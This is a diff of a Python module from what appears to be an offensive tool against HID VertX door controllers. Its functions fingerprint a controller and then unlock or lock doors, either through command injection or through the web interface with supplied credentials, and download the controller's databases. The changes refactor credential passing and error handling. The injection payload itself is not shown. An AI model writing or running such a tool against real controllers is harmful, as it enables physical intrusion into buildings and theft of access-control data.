@@ -122,7 +122,7 @@ def fingerprint(ip):
 
 # Unlock
 def unlock(ip, username, password):
-	vertx = Actions(ip, username, password)
+	vertx = Actions(ip)
 	vertx_info = vertx.fingerprint()
 	if vertx_info['vulnerable']:
 		utils.print_status('Unlocking doors using command injection')
@@ -133,21 +133,24 @@ def unlock(ip, username, password):
 			utils.print_warn('Door unlock failed')
 	else:
 		utils.print_status('Unlocking doors through the web interface')
-		response = vertx.web_unlock()
-		if response['status'] == 401:
+		response = vertx.web_unlock(username, password)
+		if response is False:
 			utils.print_warn('Door unlock failed, bad credentials')
+		elif response is None:
+			utils.print_error('VertX controller did not respond')
 		else:
 			if (response['text']).split(';')[1] == ';-1504;':
 				utils.print_good('Door successfully unlocked')
 			elif (response['text']).split(';')[1] == ';0;':
 				utils.print_warn('Door unlock failed')
 			else:
-				utils.print_error('VertX controller did not respond')
+				utils.print_error('VertX controller returned an unknown response')
+				print(response)
 
 
 # Lock
 def lock(ip, username, password):
-	vertx = Actions(ip, username, password)
+	vertx = Actions(ip)
 	vertx_info = vertx.fingerprint()
 	if vertx_info['vulnerable']:
 		utils.print_status('Locking doors using command injection')
@@ -158,16 +161,19 @@ def lock(ip, username, password):
 			utils.print_warn('Door lock failed')
 	else:
 		utils.print_status('Locking doors through the web interface')
-		response = vertx.web_lock()
-		if response['status'] == 401:
+		response = vertx.web_lock(username, password)
+		if response is False:
 			utils.print_warn('Door lock failed, bad credentials')
+		elif response is None:
+			utils.print_error('VertX controller did not respond')
 		else:
 			if (response['text']).split(';')[1] == ';-1504;':
 				utils.print_good('Door successfully locked')
 			elif (response['text']).split(';')[1] == ';0;':
 				utils.print_warn('Door lock failed')
 			else:
-				utils.print_error('VertX controller did not respond')
+				utils.print_error('VertX controller returned an unknown response')
+				print(response)
 
 
 # Raw
@@ -190,19 +196,19 @@ def raw(ip, username, password, command):
 
 # Download
 def download(ip, username, password):
-	vertx = Actions(ip, username, password)
+	vertx = Actions(ip)
 	vertx_info = vertx.fingerprint()
 	if vertx_info['vulnerable']:
 		utils.print_status('Downloading VertX databases')
-		database_responses = vertx.download()
+		database_responses = vertx.download(username, password)
 		for database in database_responses:
 			if database_responses[database]:
 				utils.print_good("Successfully downloaded {0}".format(database))
-			elif database_responses[database] is None:
-				utils.print_error("Unable to find database at http://{0}/{1}".format(ip, database))
-			else:
+			elif database_responses[database] is False:
 				utils.print_warn('Download failed, bad username or password')
 				break
+			else:
+				utils.print_error("Unable to find database at http://{0}/{1}".format(ip, database))
 	else:
 		utils.print_error('VertX controller is not vulnerable to command injection')
 
